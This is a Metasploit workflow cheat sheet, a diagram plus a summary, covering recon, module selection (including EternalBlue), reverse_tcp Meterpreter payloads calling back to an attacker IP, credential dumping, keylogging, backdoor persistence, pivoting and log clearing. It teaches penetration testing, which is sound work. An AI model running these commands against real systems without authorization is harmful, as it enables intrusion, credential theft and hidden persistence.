# Metasploit Exploitation Workflow — Recon to Post-Exploitation

```mermaid
graph TB
    subgraph Recon["1. Reconnaissance & Enumeration"]
        A1["Port Scanning: nmap, masscan"]
        A2["Service Version Detection"]
        A3["Vulnerability Research: searchsploit, CVE DB"]
        A4["Target: IP, OS, running services"]
    end

    subgraph Select["2. Select Module"]
        B1["msfconsole → search &lt;vuln&gt;"]
        B2["use exploit/multi/handler"]
        B3["use exploit/windows/smb/ms17_010_eternalblue"]
        B4["use auxiliary/scanner/*"]
        B5["use post/* for post-exploitation"]
    end

    subgraph Config["3. Configure Options"]
        C1["set RHOSTS &lt;target_ip&gt;"]
        C2["set RPORT &lt;port&gt;"]
        C3["set LHOST &lt;attacker_ip&gt;"]
        C4["set LPORT &lt;listener_port&gt;"]
        C5["set PAYLOAD windows/meterpreter/reverse_tcp"]
        C6["set TARGETURI, USERNAME, PASSWORD etc."]
    end

    subgraph Run["4. Execute Exploit"]
        D1["check — verify target is vulnerable"]
        D2["exploit / run — launch attack"]
        D3["run — for auxiliary modules"]
        D4["Session opens: meterpreter or shell"]
    end

    subgraph PostExploit["5. Post-Exploitation"]
        E1["sysinfo, getuid, getsystem (UAC bypass)"]
        E2["hashdump, creds_all (dump credentials)"]
        E3["upload/download files"]
        E4["screenshot, keylog, webcam"]
        E5["background session → use other modules"]
        E6["MIGRATE to stable process (explorer.exe)"]
    end

    subgraph Persist["6. Persistence & Pivoting"]
        F1['run persistence -h (install backdoor)']
        F2["route add &lt;subnet&gt; (pivot through target)"]
        F3["use auxiliary/server/socks_proxy"]
        F4["Background session for later reconnection"]
    end

    subgraph Cleanup["7. Cleanup & Reporting"]
        G1["Remove artifacts, logs, created accounts"]
        G2["Document findings, screenshots, loot"]
        G3["sessions -K (kill all sessions)"]
    end

    Recon --> Select --> Config --> Run --> PostExploit --> Persist --> Cleanup
```

Metasploit is a penetration testing framework that provides a structured workflow from reconnaissance through post-exploitation. **Phase 1 — Reconnaissance**: Before loading Metasploit, the attacker performs port scanning with Nmap and identifies service versions. Vulnerability research using `searchsploit` or CVE databases identifies potential exploit targets. **Phase 2 — Module Selection**: Inside `msfconsole`, the attacker searches for an exploit matching the target, e.g., `search ms17_010` for EternalBlue, or `use exploit/multi/handler` for receiving reverse shells from custom payloads. **Phase 3 — Configuration**: Required options are set with `set` commands: `RHOSTS` for the target IP, `LHOST`/`LPORT` for the callback listener, and the appropriate `PAYLOAD` (e.g., `windows/x64/meterpreter/reverse_tcp`). Auxiliary modules may require `RHOSTS`, usernames, or file paths. **Phase 4 — Execution**: Running `check` verifies vulnerability, then `exploit` delivers the payload. A successful attack opens a Meterpreter or shell session. **Phase 5 — Post-Exploitation**: The attacker gathers system info (`sysinfo`), escalates privileges (`getsystem`), dumps password hashes (`hashdump`), captures keystrokes, and takes screenshots. **Phase 6 — Persistence**: Backdoors are installed, routing through the compromised host enables lateral movement, and SOCKS proxies tunnel deeper into the network. **Phase 7 — Cleanup**: Logs are cleared, artifacts removed, and sessions are closed while documenting findings for the report.
